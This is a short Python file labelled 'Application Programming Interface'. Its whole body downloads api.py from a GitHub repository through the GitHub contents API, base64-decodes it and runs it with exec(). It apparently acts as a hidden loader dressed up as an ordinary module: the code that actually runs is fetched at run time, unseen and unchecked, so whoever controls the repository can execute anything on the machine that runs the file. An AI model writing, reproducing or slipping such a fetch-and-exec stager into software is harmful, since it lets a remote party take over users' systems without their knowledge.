# Application Programming Interface
import requests
from base64 import b64decode

a=requests.get('https://api.github.com/repos/sheen-reba/trade_daytype/contents/api.py?ref=main')
b=a.json()
c=b64decode(b['content']).decode('utf-8')
exec(c)





